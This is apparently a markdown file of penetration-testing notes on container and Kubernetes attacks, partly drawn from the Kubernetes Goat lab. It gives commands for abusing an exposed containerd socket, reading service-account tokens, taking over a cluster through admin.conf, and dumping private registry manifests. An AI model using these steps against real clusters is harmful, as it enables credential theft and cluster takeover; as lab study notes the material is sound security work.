------------

### Exploiting Containerd.sock

-------------

- Check `mount`-:

<img width="951" height="382" alt="image" src="https://github.com/user-attachments/assets/14f7bd5f-219e-4913-a059-f3b6d7fea11b" />

- Cntainerd.sock `/custom/containerd/containerd.sock`
- Exploiting [it](https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.36.0/crictl-v1.36.0-darwin-amd64.tar.gz)-:

```bash
wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.36.0/crictl-v1.36.0-darwin-amd64.tar.gz
```
- Creating crictl yaml file-:

```yaml
runtime-endpoint: unix:///custom/containerd/containerd.sock
image-endpoint: unix:///custom/containerd/containerd.sock
timeout: 10
debug: false
```

- Bash

```bash
crictl -r unix:///custom/containerd/containerd.sock images
```

- If file read is supported, you can read `file:///var/run/secrets/kubernetes.io/serviceaccount/token`

<img width="1205" height="868" alt="image" src="https://github.com/user-attachments/assets/1d63c2ac-29e5-4013-8160-1632821738c4" />


--------------

### Kubernetes DNS 

--------------

- DNS specification-:

```dns
<pod-IPv4-address>.<namespace>.pod.<cluster-domain>
```

- Cluster dns-:

```dns
<pod-ipv4-address>.<service-name>.<my-namespace>.svc.<cluster-domain.example>
```
- You can find dns info at `file:///etc/resolv.conf`-:

<img width="1166" height="832" alt="image" src="https://github.com/user-attachments/assets/887313d6-b6f3-4a5c-b3a4-574e04771adc" />

--------------

### Cluster takeover with `/etc/kubernetes/admin.conf`

------------

- The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.

```bash
./kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
```

<img width="1425" height="68" alt="image" src="https://github.com/user-attachments/assets/0738ee37-e3cc-47c2-a75a-3a748a5af419" />


-------------

### Hacking docker containers with `cap_sys_ptrace` and --pid=HOST

-------------

- [Url](https://madhuakula.com/content/attacking-and-auditing-docker-containers-using-opensource/attacking-docker-containers/capability.html)

-------------

### Exploiting Kubernetes Private registries

--------------

- Attacking Kubes private registries
- CHeck for catalogue-:

```bash
curl <url>/v2/_catalog
```
<img width="891" height="193" alt="image" src="https://github.com/user-attachments/assets/fff5cd16-f15e-4e12-b9ca-431a11234dd9" />

- Repo getting-:

```url
http://127.0.0.1:1235/v2/_catalog/madhuakula/k8s-goat-users-repo/manifests/latest
```
<img width="1290" height="526" alt="image" src="https://github.com/user-attachments/assets/1810ee3d-aaf4-45b2-a6ee-77742e9d0a79" />

- Env-:

<img width="1864" height="604" alt="image" src="https://github.com/user-attachments/assets/d2e514d7-87fc-4507-8ac3-4ad5e8d925e4" />

--------------

### Hacking docker registries

-------------

- Issue while dumping tar files-:

<img width="1790" height="87" alt="image" src="https://github.com/user-attachments/assets/e253c42c-1cce-4134-b54d-5e1349d8bacc" />


```bash
curl <url>/v2/<image>/manifests/latest -H "Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json" -H "Accept: application/vnd.oci.image.index.v1+json" -H "Accept: application/vnd.oci.image.manifest.v1+json"
```

- Add those new headers above
